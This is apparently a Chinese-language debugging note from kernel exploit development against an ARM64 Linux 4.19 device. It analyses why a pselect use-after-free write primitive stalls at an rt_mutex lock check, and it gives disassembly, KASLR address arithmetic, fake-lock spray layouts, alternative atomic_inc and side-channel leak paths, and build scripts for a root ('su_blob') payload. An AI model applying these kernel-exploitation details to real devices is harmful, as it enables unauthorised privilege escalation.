# T2' pselect 写原语：断点在 waiter->lock 自洽性检查

日期：2026-10-26
目标：`4.19.157-perf-g77c132eccfab-dirty #38`，KASLR slide=0，base `0xffffff8008080000`

## 结论

`rb_erase_cached` 在这条路径上**不可达**。写原语没落地不是参数选错，是
`rt_mutex_adjust_prio_chain` 在进 dequeue 段之前有一条自洽性检查通不过，
内核静默返回，连 oops 都没有。

```
+0x12c  0xffffff800814a12c  ldr  x8, [x25, #0x38]   ; x8 = waiter->lock
+0x130                      cmp  x21, x8            ; x21 = orig_lock（内核传入）
+0x134                      b.ne 0xffffff800814a5bc ; 不等 → +0x70c 直接返回
```

`waiter` = `task->pi_blocked_on`（x25）。我们 UAF 替换后把 `waiter->lock`
写成 spray 页里的 `fake_lock`，而 `orig_lock` 是内核从调用者一路传下来的
真实 `rt_mutex` 指针。两者不可能相等 ⇒ 每个循环都从这里退出。

## 排除过程（四条独立证据）

### 1. 地址算法核对无误，排除"打错地方"

| 量 | 值 | 来源 |
|---|---|---|
| `_text` | `0xffffff8008080000` | ELF |
| `init_uts_ns` | `0xffffff800b81bf28` | ELF 符号表 |
| `INIT_UTS_NS_OFF` | `0x0379bf28` | `target.h:53` |
| `P0_KERNEL_PHYS_LOAD` | `0x80080000` | `target.h:514` |
| `P0_KERNEL_PHYS_DELTA` | `0x80000` | 上式减 `PHYS_OFFSET` |
| 运行时 `target` | `0xffffff800381bf2c` | 日志 |

`p0_data_alias()` 推导：
```
off   = 0xffffff800b81bf28 - 0xffffff8008080000 = 0x379bf28
phys  = 0x80080000 + 0x379bf28                  = 0xb81bf28
alias = (0xb81bf28 - 0x80000000) | PAGE_OFFSET  = 0xffffff800381bf28
target= alias + UTS_NAME_SYSNAME_OFF(0x4)       = 0xffffff800381bf2c   ✓ 与日志一致
```
`init_uts_ns` 在 KIMAGE 映射（`0xffffff800b81bf2c`）和 linear-map 别名
（`0xffffff800381bf2c`）各有一份，写别名等价，地址没错。

### 2. 泄漏失败会伪装成"gadget 打中了"，已修

`prepare_kernel_page()` 原来只判 `leaked == -1`，漏掉 `leaked == 0`。
后者让 `base` 落成 0，`page_base` 变成 `PAGE_OFFSET`（`0xffffff8000000000`），
`fake_lock` 变成 `0x4d0` —— `_raw_spin_trylock` 解引用该地址直接
`fatal_exception`。`bootreason=kernel_panic,fatal_exception` 看起来像打中，
实际是泄漏失败的假崩。

P2 实测就是这种：
```
page=ffffff8000000000  fake_lock=ffffff80000004d0   → panic
```
已在 `util.c:1109` 加 `leaked == 0` 与 `base == P0_PAGE_OFFSET` 双重判据。

### 3. PARENT_CRASH 探针：page 有效时不崩

`PSELECT_PARENT_CRASH=1` 把 `tree_entry.__rb_parent_color` 设成
`0x4141414141414141`。若 `rb_erase_cached` 被调用，case1 必走
`__rb_change_child`，里面要读 `parent->rb_left`，即 `0x4141...40 + 0x10`
→ 必然 fault。

P4 实测（page 有效）：
```
page=ffffff8000378000  fake_lock=ffffff80003784d0  fake_w0=ffffff80003793a0
out5=4141414141414141        ← 崩溃值确实画进 fd_set
consumer done seq=1 mode=sched_setattr
pselect returned attempt=1 ret=0 errno=0 calls=1 success=1
uts oracle after sysname='Linux' hit=0
END RC=124                   ← 超时退出，全程无 panic
```
对照 P1/P2（page 无效）→ panic。**唯一变量是 page_base，所以 P4 的"不崩"
就是 `rb_erase_cached` 未被调用。**

### 4. 反汇编证实 trylock 的对象是真实锁

```
+0x1c8 (0xffffff800814a178)  mov  x0, x21          ; x21 = orig_lock（第 4 参数，入口 mov x21,x3）
+0x1cc                       bl   _raw_spin_trylock
+0x1d0                       cbnz w0, 0xffffff800814a084   ; 成功 → +0x1d4
+0x1d4                       mov  x0, x26          ; x26 = task->pi_lock
+0x1d8                       bl   _raw_spin_unlock_irq
+0x1dc                       yield
+0x1e4                       bl   _raw_spin_lock_irq
+0x1e8                       ldr  x25, [x19, #0x8d0]   ; 重读 pi_blocked_on
+0x1ec                       cbnz x25, 0xffffff800814a12c
+0x1f0                       b    0xffffff800814a5bc   ; 为 0 → 退出
+0x27c (0xffffff800814a12c)  ldr  x8, [x25, #0x38]   ; waiter->lock
+0x280                       cmp  x21, x8
+0x284                       b.ne 0xffffff800814a5bc   ; ← 我们死在这
```

`FAKE_LOCK_HELD=1` 把 `fake_lock+0x00` 写 1，确实能让 trylock 失败
（qspinlock val=1 ⇒ cmpxchg(0→1) 失败），但失败分支的第一件事就是
核对 `waiter->lock == orig_lock`，而 `orig_lock` 是真实锁地址。

## 两条还活着的分支

### A. trylock 成功分支（+0x1d4）

`FAKE_LOCK_HELD=0` 时不进 dequeue，改走 +0x1d4：
```
+0x1d4  mov w15, #0x10
+0x1d8  cmp x21, x23            ; orig_lock == orig_waiter ?
+0x1dc  b.eq +0x744
+0x1e0  ldr x8, [x21, #0x18]    ; lock->owner
+0x1e8  and x8, x8, #~1
+0x1ec  cmp x8, [sp, #0x10]     ; == top_task ?
+0x1f0  b.eq +0x744
+...    ldxr/ldxr atomic_inc(x19 + TASK_USAGE_OFF)   ← 32 位自增写
```
这条路存在一条 **`atomic_inc`**（不是 store），目标是
`(lock->owner & ~1) + TASK_USAGE_OFF`。对应的现成探针是
`LOCK_OWNER_INC_UTS=1`（把 owner 摆成 `sysname - TASK_USAGE_OFF`，
32 位 +1 打 "Linux"）。局限：只能 +1，不能写任意值，且 `lock->owner`
必须是能被 `cmp` 放行的值。

### B. 让 waiter->lock 与 orig_lock 一致

唯一能让 +0x27c 放行的做法是 **泄漏 orig_lock 的真实地址**并写进
`waiter->lock`。`orig_lock` 来自 `rt_mutex_adjust_pi(task)` 的调用者，
是 `task->pi_blocked_on` 所属的那个 `rt_mutex`。KernelSnitch 已经能稳定
泄漏 `mm_struct`（`ffffff80401f7b98` 级别），同一套 side-channel 扩到
`rt_mutex` 需要另找页内偏移模板。

## 下一步

1. 先跑 `FAKE_LOCK_HELD=0 LOCK_OWNER_INC_UTS=1`，确认 +0x1d4 分支可达
   （判据：`uname -s` 从 `Linux` 变成 `Minyx` 之类 +1 结果 —— 注意
   `LK` 两字节会变成 `ML`，观测的是 sysname 首 4 字节被当作 u32 +1）。
2. 若 A 可达，评估能否把 `atomic_inc` 升级成任意写（同一分支后段还有
   `+0x1f8 ldr x13,[x1,#0x8]!` 的指针跟随，可探）。
3. 若 A 不可达，转 T4（KGSL `gpuobj_import(0x48)` / `sparse_bind(0x54)`），
   不再在 pselect 这条路上耗。

## 复现命令

```bash
cd /e/BOOX
./build_preload.sh                      # 编出 preload.so（含 su_blob/wallpaper_blob）
./t2p_p2.sh P4_crash 1                  # page 有效 + PARENT_CRASH，预期不 panic
./t2p_p2.sh P5_inc   0                  # 预期打 +0x1d4 的 atomic_inc 分支
```
